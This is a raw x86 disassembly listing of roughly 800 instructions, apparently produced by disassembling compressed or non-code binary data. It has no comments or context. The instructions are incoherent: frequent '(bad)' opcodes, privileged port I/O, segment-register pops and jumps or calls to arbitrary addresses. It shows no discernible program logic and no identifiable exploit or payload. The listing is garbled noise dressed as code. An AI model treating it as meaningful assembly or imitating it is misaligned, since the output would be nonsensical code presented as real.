  6b1d95:	pop    eax
  6b1d96:	xchg   ch,al
  6b1d98:	in     eax,0x52
  6b1d9a:	xchg   DWORD PTR [edi-0x42],edi
  6b1d9d:	outs   dx,DWORD PTR ds:[esi]
  6b1d9e:	or     dh,BYTE PTR [edx+0x4]
  6b1da1:	mov    ecx,0x40a8bba0
  6b1da6:	adc    eax,0x96c5e19c
  6b1dab:	sbb    ah,BYTE PTR [edx-0x67]
  6b1dae:	pop    ds
  6b1daf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6b1db0:	loop   0x6b1d33
  6b1db2:	aas    
  6b1db3:	mov    ah,0x2b
  6b1db5:	test   al,0x39
  6b1db7:	mov    esp,0xfe017b63
  6b1dbc:	jno    0x6b1d92
  6b1dbe:	not    DWORD PTR [ebx+0x3541b3c2]
  6b1dc4:	test   al,0x10
  6b1dc6:	daa    
  6b1dc7:	xlat   BYTE PTR ds:[ebx]
  6b1dc8:	jne    0x6b1e41
  6b1dca:	sub    ah,BYTE PTR [ecx+0x60]
  6b1dcd:	pop    ebx
  6b1dce:	(bad)  
  6b1dd0:	loopne 0x6b1e04
  6b1dd2:	dec    esp
  6b1dd3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6b1dd4:	mov    al,ds:0xfe9656f6
  6b1dd9:	jl     0x6b1dd8
  6b1ddb:	popa   
  6b1ddc:	adc    BYTE PTR [ebx],ch
  6b1dde:	fwait
  6b1ddf:	fwait
  6b1de0:	mov    dl,0xeb
  6b1de2:	jae    0x6b1e00
  6b1de4:	jnp    0x6b1d74
  6b1de6:	dec    edx
  6b1de7:	call   0xdb52ac25
  6b1dec:	sbb    al,0x34
  6b1dee:	inc    edx
  6b1def:	mov    ecx,0x35c18242
  6b1df4:	loopne 0x6b1e1f
  6b1df6:	pop    esp
  6b1df7:	leave  
  6b1df8:	pop    es
  6b1df9:	hlt    
  6b1dfa:	inc    ebp
  6b1dfb:	in     eax,dx
  6b1dfc:	xor    BYTE PTR [edx],bh
  6b1dfe:	add    eax,0xb2b0e8fb
  6b1e03:	xchg   ebx,eax
  6b1e04:	inc    ebp
  6b1e05:	ficomp WORD PTR [edi+0x64]
  6b1e08:	cli    
  6b1e09:	add    al,0x9e
  6b1e0b:	xacquire xchg DWORD PTR [ebp+0x68be19],ebx
  6b1e12:	push   eax
  6b1e13:	lahf   
  6b1e14:	push   edx
  6b1e15:	pop    edi
  6b1e16:	scas   al,BYTE PTR es:[edi]
  6b1e17:	retf   
  6b1e18:	out    dx,al
  6b1e19:	sbb    al,0xd5
  6b1e1b:	retf   0x50b3
  6b1e1e:	sbb    al,0x72
  6b1e20:	(bad)  
  6b1e21:	je     0x6b1e0d
  6b1e23:	xchg   ebx,eax
  6b1e24:	jmp    0x6b1e72
  6b1e26:	sbb    dl,bl
  6b1e28:	retf   0x7ded
  6b1e2b:	pop    ss
  6b1e2c:	push   ds
  6b1e2d:	shr    BYTE PTR ds:0x93bc584a,1
  6b1e33:	cmp    al,BYTE PTR [eax-0x50]
  6b1e36:	push   ecx
  6b1e37:	outs   dx,DWORD PTR ds:[esi]
  6b1e38:	cwde   
  6b1e39:	mov    ecx,0xfdcb5c54
  6b1e3e:	sub    eax,0x8d110527
  6b1e43:	sbb    edx,edx
  6b1e45:	mov    al,0x1c
  6b1e47:	sti    
  6b1e48:	aaa    
  6b1e49:	es cmc 
  6b1e4b:	mov    esp,0xb8c952e8
  6b1e50:	jns    0x6b1e18
  6b1e52:	aas    
  6b1e53:	hlt    
  6b1e54:	xor    ebx,DWORD PTR [edi]
  6b1e56:	mov    al,ds:0x94553955
  6b1e5b:	enter  0x42e4,0x1d
  6b1e5f:	inc    eax
  6b1e60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6b1e61:	sahf   
  6b1e62:	pop    edi
  6b1e63:	mov    eax,ds:0xa6f7d5dd
  6b1e68:	ror    DWORD PTR [eax-0x66],0x35
  6b1e6c:	mov    ecx,edi
  6b1e6e:	pop    esi
  6b1e6f:	dec    esi
  6b1e70:	cmp    edx,DWORD PTR [ebp+0x534e023]
  6b1e76:	inc    eax
  6b1e78:	(bad)  [ebp+0x2df1af08]
  6b1e7e:	inc    eax
  6b1e7f:	xor    esp,esp
  6b1e81:	jg     0x6b1eda
  6b1e83:	mov    esi,0x7e7e5aa3
  6b1e88:	pop    esi
  6b1e89:	imul   esp,esp,0x216840ef
  6b1e8f:	cwde   
  6b1e90:	cwde   
  6b1e91:	out    0x98,eax
  6b1e93:	dec    esp
  6b1e94:	cmp    BYTE PTR [ecx+esi*2-0x77706388],cl
  6b1e9b:	add    eax,0xc9567679
  6b1ea0:	mov    ds:0x8f46c634,al
  6b1ea5:	cmp    ax,WORD PTR [edx+0x31]
  6b1ea9:	fcomi  st,st(4)
  6b1eab:	pop    esi
  6b1eac:	daa    
  6b1ead:	and    eax,0x136302fd
  6b1eb2:	test   BYTE PTR [ecx-0x5b035a65],bl
  6b1eb8:	jae    0x6b1e94
  6b1eba:	jno    0x6b1ef9
  6b1ebc:	ret    0xebfe
  6b1ebf:	mov    ch,bl
  6b1ec1:	stos   DWORD PTR es:[edi],eax
  6b1ec2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6b1ec3:	push   0xc4532993
  6b1ec8:	in     eax,0x27
  6b1eca:	pop    esi
  6b1ecb:	lea    edi,[ecx-0x27e4bbfd]
  6b1ed1:	xor    bl,BYTE PTR [edx+eiz*8]
  6b1ed4:	cli    
  6b1ed5:	push   0x957a17d6
  6b1eda:	push   esi
  6b1edb:	pop    esp
  6b1edc:	int    0xc0
  6b1ede:	inc    ebp
  6b1edf:	test   DWORD PTR [ecx-0x4a],0xd02845b3
  6b1ee6:	cmp    DWORD PTR [ebp-0x4b],ebx
  6b1ee9:	pop    es
  6b1eea:	add    BYTE PTR [edi-0x14],0x66
  6b1eee:	arpl   WORD PTR [esi-0x29a8a9d0],di
  6b1ef4:	mov    dh,0x37
  6b1ef6:	mov    ds:0xf7ffff2a,al
  6b1efb:	dec    ebp
  6b1efc:	sbb    al,0x92
  6b1efe:	imul   BYTE PTR [edi-0x38]
  6b1f01:	and    ecx,esi
  6b1f03:	mov    esp,0x48a4ff7f
  6b1f08:	or     ah,BYTE PTR [ecx]
  6b1f0a:	(bad)  
  6b1f0b:	inc    ebx
  6b1f0c:	fdiv   st,st(4)
  6b1f0e:	pop    es
  6b1f0f:	out    0x2f,al
  6b1f11:	imul   ebp,DWORD PTR [ebp-0x60],0x72
  6b1f15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6b1f16:	gs in  al,dx
  6b1f18:	lea    ebx,[edx]
  6b1f1a:	ds cdq 
  6b1f1c:	fucomi st,st(6)
  6b1f1e:	add    ebp,DWORD PTR [eax]
  6b1f20:	lea    esi,[ebx-0x2b]
  6b1f23:	rol    DWORD PTR [edi],0xd6
  6b1f26:	push   cs
  6b1f27:	dec    eax
  6b1f28:	xchg   edx,eax
  6b1f29:	sbb    eax,0x49019e40
  6b1f2e:	inc    ecx
  6b1f2f:	out    dx,al
  6b1f30:	push   ebx
  6b1f31:	cmp    BYTE PTR [ebp+ebp*4-0x39],dl
  6b1f35:	les    esi,FWORD PTR [esi-0x72]
  6b1f38:	mov    ah,0x89
  6b1f3a:	(bad)  
  6b1f3b:	jnp    0x6b1f41
  6b1f3d:	sbb    eax,0xde26366e
  6b1f42:	not    cl
  6b1f44:	jle    0x6b1fa8
  6b1f46:	jae    0x6b1f4a
  6b1f48:	pop    esi
  6b1f49:	dec    esp
  6b1f4a:	cdq    
  6b1f4b:	(bad)  
  6b1f4c:	out    dx,al
  6b1f4d:	inc    ecx
  6b1f4e:	test   BYTE PTR [eax+ebp*1-0x168b7544],dl
  6b1f55:	out    dx,al
  6b1f56:	mov    DWORD PTR [edi+0x565bd6aa],ebp
  6b1f5c:	pop    ecx
  6b1f5d:	stc    
  6b1f5e:	adc    ch,BYTE PTR [ebx]
  6b1f60:	pop    ds
  6b1f61:	mov    cl,0x7a
  6b1f63:	je     0x6b1f7a
  6b1f65:	nop
  6b1f66:	in     eax,dx
  6b1f67:	test   al,0x94
  6b1f69:	imul   ecx,DWORD PTR [eax+0x48],0xffffffe1
  6b1f6d:	adc    DWORD PTR [ecx],edx
  6b1f6f:	push   esi
  6b1f70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6b1f71:	imul   esp,ebp,0xffffffd2
  6b1f74:	in     eax,dx
  6b1f75:	ror    DWORD PTR [ebx-0x660ca357],cl
  6b1f7b:	mov    ebx,0xcc6e776a
  6b1f80:	lahf   
  6b1f81:	scas   eax,DWORD PTR es:[edi]
  6b1f82:	pop    ebx
  6b1f83:	ins    BYTE PTR es:[edi],dx
  6b1f84:	jae    0x6b1ffa
  6b1f86:	cmp    al,0xf1
  6b1f88:	cmp    eax,0xad73579b
  6b1f8d:	aaa    
  6b1f8e:	js     0x6b1ffd
  6b1f90:	cmp    dh,ch
  6b1f92:	push   esp
  6b1f93:	ss aam 0x13
  6b1f96:	mov    al,0xa3
  6b1f98:	mov    ah,0xcb
  6b1f9a:	mov    cl,0x60
  6b1f9c:	(bad)  
  6b1f9d:	clc    
  6b1f9e:	push   ds
  6b1f9f:	fisubr DWORD PTR [eax+0x662a3543]
  6b1fa5:	or     DWORD PTR [esi-0x4a768fec],0xffffff8f
  6b1fac:	lock xor ebx,DWORD PTR [eax]
  6b1faf:	retf   
  6b1fb0:	fst    QWORD PTR [eax]
  6b1fb2:	or     eax,0x53a61623
  6b1fb7:	(bad)  
  6b1fb8:	push   ebp
  6b1fb9:	fs push edx
  6b1fbb:	scas   al,BYTE PTR es:[edi]
  6b1fbc:	pop    ss
  6b1fbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6b1fbe:	stos   DWORD PTR es:[edi],eax
  6b1fbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6b1fc0:	or     al,0xd4
  6b1fc2:	jbe    0x6b1ffa
  6b1fc4:	jo     0x6b1fa2
  6b1fc6:	dec    edx
  6b1fc7:	jb     0x6b1fa8
  6b1fc9:	(bad)  
  6b1fca:	jmp    0xdd696adf
  6b1fcf:	sahf   
  6b1fd0:	lods   eax,DWORD PTR ds:[esi]
  6b1fd1:	sti    
  6b1fd2:	add    eax,0x5690a213
  6b1fd7:	rcr    DWORD PTR [esi+0x723bdd22],cl
  6b1fdd:	or     DWORD PTR [ecx-0x77],esp
  6b1fe0:	out    0xf9,eax
  6b1fe2:	fwait
  6b1fe3:	jns    0x6b2027
  6b1fe5:	test   al,0x29
  6b1fe7:	jbe    0x6b1f90
  6b1fe9:	push   ds
  6b1fea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6b1feb:	mov    esp,0x457c0b6b
  6b1ff0:	adc    ebp,DWORD PTR [eax-0x7b]
  6b1ff3:	outs   dx,BYTE PTR ds:[esi]
  6b1ff4:	mov    ebp,DWORD PTR [ebp-0xc]
  6b1ff7:	es pop ebx
  6b1ff9:	(bad)  
  6b1ffa:	not    DWORD PTR [edx]
  6b1ffc:	mov    edi,0xe1e166c8
  6b2001:	jle    0x6b204c
  6b2003:	pop    ebx
  6b2004:	jbe    0x6b2070
  6b2006:	sbb    BYTE PTR [di],al
  6b2009:	mov    ah,BYTE PTR [ebx-0x4d04293f]
  6b200f:	leave  
  6b2010:	pop    ecx
  6b2011:	mov    dl,0xb0
  6b2013:	pop    esi
  6b2014:	gs mov edx,0x6d840107
  6b201a:	sbb    BYTE PTR [edi-0x6b8d6516],al
  6b2020:	scas   eax,DWORD PTR es:[edi]
  6b2021:	push   eax
  6b2022:	jne    0x6b2055
  6b2024:	push   ds
  6b2025:	pushf  
  6b2026:	sbb    dl,BYTE PTR ds:0x910dade9
  6b202c:	sub    ah,BYTE PTR [eax+0x7581bb11]
  6b2032:	xchg   DWORD PTR [eax-0x165131a6],ecx
  6b2038:	adc    al,0x8d
  6b203a:	xchg   edi,eax
  6b203b:	jge    0x6b1fff
  6b203d:	fimul  DWORD PTR [esi+0x7e4d581a]
  6b2043:	mov    eax,ecx
  6b2045:	mov    ebx,0x1ea69018
  6b204a:	je     0x6b20af
  6b204c:	mov    ds:0x8be2ff4a,al
  6b2052:	sbb    al,0xda
  6b2054:	xchg   ebx,eax
  6b2055:	leave  
  6b2056:	mov    al,ds:0xed259937
  6b205b:	xor    eax,0x94abb36f
  6b2060:	pop    ebp
  6b2061:	scas   eax,DWORD PTR es:[edi]
  6b2062:	adc    BYTE PTR [ebp+esi*4-0x48],al
  6b2066:	es test eax,0x3f490c8c
  6b206c:	xchg   edi,eax
  6b206d:	addr16 jb 0x6b20e3
  6b2070:	mov    cl,0xec
  6b2072:	(bad)  
  6b2073:	xchg   ebp,eax
  6b2074:	adc    DWORD PTR [esi+0x7c],edx
  6b2077:	ins    BYTE PTR es:[edi],dx
  6b2078:	aad    0x86
  6b207a:	xchg   edi,eax
  6b207b:	jmp    0x6b20f6
  6b207d:	jge    0x6b205c
  6b207f:	gs pop ebx
  6b2081:	xchg   ebp,eax
  6b2082:	mov    ch,0xe5
  6b2084:	adc    bl,cl
  6b2086:	jae    0x6b20a0
  6b2088:	jmp    0xa9c3de97
  6b208d:	scas   eax,DWORD PTR es:[edi]
  6b208e:	std    
  6b208f:	dec    eax
  6b2090:	ins    DWORD PTR es:[edi],dx
  6b2091:	push   edx
  6b2092:	call   0x55132237
  6b2097:	sub    esi,DWORD PTR [edi]
  6b2099:	(bad)  
  6b209a:	mov    BYTE PTR [edi],bl
  6b209c:	aas    
  6b209d:	in     eax,dx
  6b209e:	dec    esi
  6b209f:	shl    BYTE PTR [ebp+ebx*4-0x1e1fab69],0xa4
  6b20a7:	mov    eax,ds:0x59da03d1
  6b20ac:	or     ebp,DWORD PTR ds:0x9bc26bd8
  6b20b2:	pop    ds
  6b20b3:	add    ecx,DWORD PTR [eax+0x7c]
  6b20b6:	pop    es
  6b20b7:	push   ecx
  6b20b8:	or     edi,eax
  6b20ba:	loopne 0x6b2095
  6b20bc:	inc    edx
  6b20bd:	ja     0x6b20f2
  6b20bf:	loop   0x6b20f9
  6b20c1:	dec    ecx
  6b20c2:	mov    ebx,0x3e289b28
  6b20c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6b20c8:	and    ebx,esi
  6b20ca:	rcr    ecx,cl
  6b20cc:	test   edx,edi
  6b20ce:	xrelease xchg DWORD PTR [edx+eiz*8+0x5c],ebp
  6b20d3:	mov    dh,0x67
  6b20d5:	popa   
  6b20d6:	fist   WORD PTR [esi]
  6b20d8:	lods   al,BYTE PTR ds:[esi]
  6b20d9:	or     DWORD PTR ds:0xc15943b6,ecx
  6b20df:	pop    ebp
  6b20e0:	and    cl,0xac
  6b20e3:	dec    ebp
  6b20e4:	es fucomp st(0)
  6b20e7:	jbe    0x6b2122
  6b20e9:	pushf  
  6b20ea:	add    esi,DWORD PTR [eax+0x74]
  6b20ed:	cmp    BYTE PTR [esi],0x52
  6b20f0:	scas   eax,DWORD PTR es:[edi]
  6b20f1:	out    dx,eax
  6b20f2:	ds sub edx,0x5cfd8219
  6b20f9:	stc    
  6b20fa:	fs (bad) 
  6b20fc:	clc    
  6b20fd:	lahf   
  6b20fe:	das    
  6b20ff:	loope  0x6b20a7
  6b2101:	outs   dx,BYTE PTR ds:[esi]
  6b2102:	aam    0x42
  6b2104:	nop
  6b2105:	push   eax
  6b2106:	sahf   
  6b2107:	inc    ecx
  6b2108:	mov    eax,DWORD PTR [esi+edx*4]
  6b210b:	repz in al,dx
  6b210d:	lods   al,BYTE PTR ds:[esi]
  6b210e:	outs   dx,DWORD PTR ds:[esi]
  6b210f:	jo     0x6b217f
  6b2111:	mov    eax,ds:0xc9226acc
  6b2116:	mov    cl,0x52
  6b2118:	mov    al,0x2e
  6b211a:	into   
  6b211b:	mov    edi,0x6be776de
  6b2120:	pop    esp
  6b2121:	lds    edx,FWORD PTR ds:0x72fbab60
  6b2127:	in     al,0x63
  6b2129:	arpl   bx,si
  6b212b:	frstpm(287 only) 
  6b212d:	dec    ebp
  6b212e:	les    eax,FWORD PTR [eax]
  6b2130:	push   eax
  6b2131:	mov    bh,0x2d
  6b2133:	xchg   ebp,eax
  6b2134:	repnz into 
  6b2136:	ss (bad) 
  6b2138:	aas    
  6b2139:	repnz and bl,BYTE PTR [esi-0x7e]
  6b213d:	pop    edx
  6b213e:	aam    0x83
  6b2140:	pop    ebx
  6b2141:	out    0x75,eax
  6b2143:	pop    ecx
  6b2144:	or     DWORD PTR [esi+ecx*1+0xeb8e487],ebx
  6b214b:	pusha  
  6b214c:	aad    0x45
  6b214e:	mov    bh,0xe4
  6b2150:	and    BYTE PTR [esi+eax*2],bh
  6b2153:	push   edi
  6b2154:	sahf   
  6b2155:	nop
  6b2156:	call   0xcc3a:0x2bd7b6a
  6b215d:	jle    0x6b2141
  6b215f:	xor    edx,ebx
  6b2161:	mov    esp,0xb2161a89
  6b2166:	sar    ch,0x46
  6b2169:	cs or  al,0x69
  6b216c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6b216d:	push   ecx
  6b216e:	mov    ecx,0x79fc79e6
  6b2173:	mov    al,0x35
  6b2175:	mov    ebp,0xeb685c8f
  6b217a:	or     ebp,DWORD PTR [ecx-0x26c837db]
  6b2180:	gs or  al,ch
  6b2183:	ds add al,0xf8
  6b2186:	cld    
  6b2187:	les    edi,FWORD PTR [eax-0x5c]
  6b218a:	dec    edx
  6b218b:	adc    DWORD PTR [eax],edx
  6b218d:	ret    0x2d8d
  6b2190:	inc    esp
  6b2191:	cmp    al,dh
  6b2193:	adc    DWORD PTR [eax],esp
  6b2195:	cwde   
  6b2196:	js     0x6b2202
  6b2198:	loope  0x6b2183
  6b219a:	pop    ebx
  6b219b:	pop    ebx
  6b219c:	xchg   esi,eax
  6b219d:	fild   DWORD PTR [eax+0x31]
  6b21a0:	mov    ah,0xeb
  6b21a2:	pop    esi
  6b21a3:	inc    ebp
  6b21a4:	cmp    BYTE PTR [ebx],ch
  6b21a6:	pop    esi
  6b21a7:	push   ebx
  6b21a8:	xchg   ebx,eax
  6b21a9:	xchg   esp,eax
  6b21aa:	push   0xffffffa7
  6b21ac:	xor    DWORD PTR [eax+edx*8],0xb5b05dbb
  6b21b3:	dec    ecx
  6b21b4:	push   ecx
  6b21b5:	out    dx,eax
  6b21b6:	jecxz  0x6b21b0
  6b21b8:	and    bl,0xe5
  6b21bb:	sbb    DWORD PTR [edx+0x53],edx
  6b21be:	inc    esi
  6b21bf:	stos   BYTE PTR es:[edi],al
  6b21c0:	xor    esp,DWORD PTR [ecx+0x6e]
  6b21c3:	mov    eax,0x9ec4fe31
  6b21c8:	fcmovb st,st(4)
  6b21ca:	fs mov ch,0xce
  6b21cd:	cmp    ecx,DWORD PTR [esi]
  6b21cf:	imul   edi,DWORD PTR [edx+0x45917504],0x7d
  6b21d6:	inc    esi
  6b21d7:	(bad)  
  6b21d8:	ficom  DWORD PTR [ecx+0x5]
  6b21db:	retf   
  6b21dc:	jp     0x6b2236
  6b21de:	jne    0x6b2228
  6b21e0:	mov    ecx,0xee2d83db
  6b21e5:	pop    edi
  6b21e6:	mov    eax,ds:0x78b52662
  6b21eb:	and    al,0x96
  6b21ed:	nop
  6b21ee:	sbb    eax,0xc094b5ec
  6b21f3:	pop    ds
  6b21f4:	xchg   ecx,eax
  6b21f5:	cmp    eax,0x6259597c
  6b21fa:	xor    BYTE PTR [esi],dl
  6b21fc:	jne    0x6b2255
  6b21fe:	(bad)  
  6b21ff:	fmul   st(2),st
  6b2201:	xchg   ebp,eax
  6b2202:	and    cl,BYTE PTR [ebp+edi*4+0x460b83c5]
  6b2209:	jmp    0x6b21fe
  6b220b:	add    DWORD PTR [edx],eax
  6b220d:	ret    
  6b220e:	mov    ds:0xe3309d05,eax
  6b2213:	lods   al,BYTE PTR ds:[esi]
  6b2214:	dec    esi
  6b2215:	or     BYTE PTR [edx+eiz*2+0x18],al
  6b2219:	xor    al,0x10
  6b221b:	xor    eax,0x45166627
  6b2220:	enter  0x3ca6,0x8a
  6b2224:	lods   al,BYTE PTR ds:[esi]
  6b2225:	adc    al,0xeb
  6b2227:	pop    edi
  6b2228:	cmc    
  6b2229:	fbstp  TBYTE PTR [edx-0x6f62d122]
  6b222f:	and    BYTE PTR [ecx+0x67],bl
  6b2232:	in     eax,0xd7
  6b2234:	sti    
  6b2235:	ficom  WORD PTR [ebx-0x3babb08e]
  6b223b:	scas   eax,DWORD PTR es:[edi]
  6b223c:	call   0xd55b34d8
  6b2241:	jle    0x6b2260
  6b2243:	test   DWORD PTR [edx+0x6],ebp
  6b2246:	sbb    DWORD PTR [edi+0x5b],ebx
  6b2249:	cli    
  6b224a:	sbb    al,0x9d
  6b224c:	and    ebx,DWORD PTR [eax+0xe2ea263]
  6b2252:	jecxz  0x6b2227
  6b2254:	sbb    eax,0x151e501f
  6b2259:	fdiv   DWORD PTR [eax]
  6b225b:	xlat   BYTE PTR ds:[ebx]
  6b225c:	scas   al,BYTE PTR es:[edi]
  6b225d:	or     dh,ch
  6b225f:	xchg   ebp,eax
  6b2260:	icebp  
  6b2261:	sahf   
  6b2262:	fs std 
  6b2264:	mov    ds:0x83d9780c,al
  6b2269:	imul   ebx,DWORD PTR [eax+eiz*1],0x3a
  6b226d:	(bad)  [ebx-0x6608f8fc]
  6b2273:	lea    ebp,[ebp+ebx*8-0x23]
  6b2277:	rol    DWORD PTR [ebx-0x9],1
  6b227a:	cld    
  6b227b:	dec    eax
  6b227c:	mov    cl,0xc5
  6b227e:	enter  0x77be,0xfa
  6b2282:	cmp    DWORD PTR [edx],edx
  6b2284:	leave  
  6b2285:	scas   eax,DWORD PTR es:[edi]
  6b2286:	or     DWORD PTR [ebp+0x497400dc],ebp
  6b228c:	arpl   WORD PTR [edx],di
  6b228e:	fstp   TBYTE PTR [ebp+0x5a30e11]
  6b2294:	xor    al,0x57
  6b2296:	mov    DWORD PTR [ecx],eax
  6b2298:	test   BYTE PTR [ebp-0x6b607a41],ah
  6b229e:	jmp    FWORD PTR [ebp+esi*1-0x45]
  6b22a2:	cmp    al,0x1c
  6b22a4:	adc    al,0xe5
  6b22a6:	rol    BYTE PTR [edx+0x68],0x66
  6b22aa:	dec    ecx
  6b22ab:	xor    al,0x7a
  6b22ad:	sub    dh,al
  6b22af:	pop    ebp
  6b22b0:	pop    ebx
  6b22b1:	cmp    edx,DWORD PTR [ebx-0x46]
  6b22b4:	aad    0x6b
  6b22b6:	test   eax,0x756d568e
  6b22bb:	pop    ss
  6b22bc:	test   edi,edx
  6b22be:	xchg   esi,eax
  6b22bf:	aam    0xfd
  6b22c1:	sahf   
  6b22c2:	jo     0x6b22b6
  6b22c4:	sub    BYTE PTR [ebp-0x40cf8246],bl
  6b22ca:	add    BYTE PTR [ecx+0x53],0xc2
  6b22ce:	or     al,0xd7
  6b22d0:	sub    BYTE PTR [ebx+esi*1+0x3138f574],ch
  6b22d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6b22d8:	pop    ss
  6b22d9:	add    DWORD PTR [eax],ecx
  6b22db:	je     0x6b234a
  6b22dd:	or     al,0xe4
  6b22df:	icebp  
  6b22e0:	cmp    cl,0xc6
  6b22e3:	mov    cl,0xc7
  6b22e6:	jmp    0x6b22ec
  6b22e8:	sub    cl,BYTE PTR ds:0x8dea1f55
  6b22ee:	cli    
  6b22ef:	xlat   BYTE PTR ds:[ebx]
  6b22f0:	inc    eax
  6b22f1:	xor    dl,ch
  6b22f3:	fsubr  DWORD PTR [edx+0x7]
  6b22f6:	scas   al,BYTE PTR es:[edi]
  6b22f7:	test   BYTE PTR [ecx+0xa0b0a29],ah
  6b22fd:	inc    ebx
  6b22fe:	push   esi
  6b22ff:	cmovb  esp,DWORD PTR [ecx-0x4e]
  6b2303:	jno    0x6b22d7
  6b2305:	jb     0x6b22c8
  6b2307:	rcl    DWORD PTR es:[edx+0x13],0x55
  6b230c:	xor    DWORD PTR [esi-0x3ae8ea09],edx
  6b2312:	inc    edi
  6b2313:	(bad)  
  6b2315:	xchg   DWORD PTR [ecx],ebp
  6b2317:	push   ebp
  6b2318:	scas   al,BYTE PTR es:[edi]
  6b2319:	lock fldcw WORD PTR [edi]
  6b231c:	outs   dx,BYTE PTR ds:[esi]
  6b231d:	je     0x6b22b6
  6b231f:	or     eax,0xf77e15f7
  6b2324:	stos   DWORD PTR es:[edi],eax
  6b2325:	xchg   BYTE PTR [ecx],dh
  6b2327:	jno    0x6b2353
  6b2329:	sti    
  6b232a:	ins    DWORD PTR es:[edi],dx
  6b232b:	adc    al,0x70
  6b232d:	loopne 0x6b22dc
  6b232f:	retf   
  6b2330:	mov    edx,DWORD PTR [ecx]
  6b2332:	sub    al,BYTE PTR [ebp+0x52796d2a]
  6b2338:	sub    al,0xb2
  6b233a:	fs pushf 
  6b233c:	pop    esi
  6b233d:	mov    ah,0x6a
  6b233f:	int3   
  6b2340:	ja     0x6b2335
  6b2342:	or     ebx,edx
  6b2344:	sub    ah,BYTE PTR [esi+eax*2+0x1773d42c]
  6b234b:	loop   0x6b2398
  6b234d:	pushf  
  6b234e:	mov    ebx,0x121fd7b8
  6b2353:	dec    edi
  6b2354:	stc    
  6b2355:	and    ah,BYTE PTR [ebx-0x2efc6083]
  6b235b:	sbb    DWORD PTR [ecx-0x46],0x3165b9d1
  6b2362:	cwde   
  6b2363:	jmp    0x6b23d8
  6b2365:	loopne 0x6b230c
  6b2367:	adc    ah,dh
  6b2369:	(bad)  
  6b236a:	mov    cl,0xc9
  6b236c:	inc    ecx
  6b236d:	shl    DWORD PTR [esi+0xe],cl
  6b2370:	mov    esp,0xc04fae60
  6b2375:	es or  al,dl
  6b2378:	lds    edi,FWORD PTR [ebp-0x1]
  6b237b:	push   ebx
  6b237c:	dec    eax
  6b237d:	ins    DWORD PTR es:[edi],dx
  6b237e:	repnz std 
  6b2380:	push   eax
  6b2381:	push   0xd7fb77b3
  6b2386:	mov    BYTE PTR [ebx-0x18],ah
  6b2389:	add    al,0xdf
  6b238b:	outs   dx,BYTE PTR ds:[esi]
  6b238c:	and    al,0xe2
  6b238e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6b238f:	xchg   esi,eax
  6b2390:	cli    
  6b2391:	in     al,0x4b
  6b2393:	iret   
  6b2394:	push   edi
  6b2395:	and    eax,0xe55a4825
  6b239a:	push   esp
  6b239b:	push   ecx
  6b239c:	inc    esi
  6b239d:	cmp    BYTE PTR [esi+0x26],ah
  6b23a0:	ret    0x5471
  6b23a3:	cmp    eax,0x7dc8bd84
  6b23a8:	push   cs
  6b23a9:	xor    al,0x5b
  6b23ab:	out    0x91,al
  6b23ad:	add    ecx,DWORD PTR [ecx+0x68]
  6b23b0:	push   esi
  6b23b1:	xor    BYTE PTR [bx+si],ah
  6b23b4:	mov    ah,0x88
  6b23b6:	cdq    
  6b23b7:	iret   
  6b23b8:	mov    eax,0x63eda6d8
  6b23bd:	jl     0x6b2358
  6b23bf:	outs   dx,DWORD PTR ds:[esi]
  6b23c0:	(bad)  
  6b23c2:	xchg   DWORD PTR [edx+0x701628b0],ebp
  6b23c8:	test   DWORD PTR [edx],edi
  6b23ca:	imul   esi,DWORD PTR [edi+0x27],0x81e1442b
  6b23d1:	or     BYTE PTR [edi],al
  6b23d3:	rcl    BYTE PTR [eax+0x34a2c812],1
  6b23d9:	adc    eax,DWORD PTR [eax+0x2e27b705]
  6b23df:	dec    ebp
  6b23e0:	clc    
  6b23e1:	aas    
  6b23e2:	(bad)  
  6b23e3:	out    dx,eax
  6b23e4:	repnz mov al,cl
  6b23e7:	loop   0x6b2444
  6b23e9:	xor    al,0x78
  6b23eb:	pop    ebp
  6b23ec:	mov    DWORD PTR [ebp+0x3c],0x7a043c16
  6b23f3:	std    
  6b23f4:	sbb    al,0xcf
  6b23f6:	aaa    
  6b23f7:	push   edi
  6b23f8:	sub    DWORD PTR [ebx],ecx
  6b23fa:	pop    ds
  6b23fb:	push   esi
  6b23fc:	in     al,dx
  6b23fd:	mov    dl,0xa1
  6b23ff:	in     eax,dx
  6b2400:	dec    edi
  6b2401:	loope  0x6b2460
  6b2403:	gs fwait
  6b2405:	xchg   edi,eax
  6b2406:	xchg   edi,eax
  6b2407:	int3   
  6b2408:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6b2409:	sbb    al,0x90
  6b240b:	add    DWORD PTR [ecx+0x4b],esp
  6b240e:	lods   al,BYTE PTR ds:[esi]
  6b240f:	sbb    dl,BYTE PTR [edi+eiz*8]
  6b2412:	sub    BYTE PTR [eax-0x18e88281],al
  6b2418:	mov    edx,0xf418894e
  6b241d:	dec    eax
  6b241e:	mov    al,BYTE PTR [edi]
  6b2420:	pop    es
  6b2421:	jmp    0x910f4c0c
  6b2426:	(bad)  
  6b2428:	outs   dx,BYTE PTR ds:[esi]
  6b2429:	out    dx,eax
  6b242a:	xor    al,dl
  6b242c:	pop    ebx
  6b242d:	ret    
  6b242e:	pop    ss
  6b242f:	jle    0x6b23bf
  6b2431:	shl    esp,0x5b
  6b2434:	pop    es
  6b2435:	test   al,0x33
  6b2437:	jnp    0x6b24b8
  6b2439:	cli    
  6b243a:	xchg   edx,eax
  6b243b:	inc    esi
  6b243c:	cmc    
  6b243d:	fcomp  DWORD PTR [ecx-0x1c3f5138]
  6b2443:	push   DWORD PTR [ebx+eiz*4-0x2a]
  6b2447:	test   al,0x2b
  6b2449:	in     eax,0xdc
  6b244b:	jno    0x6b23fe
  6b244d:	xchg   ebx,eax
  6b244e:	(bad)  
  6b244f:	arpl   WORD PTR [ebx-0x793f2077],dx
  6b2455:	dec    edx
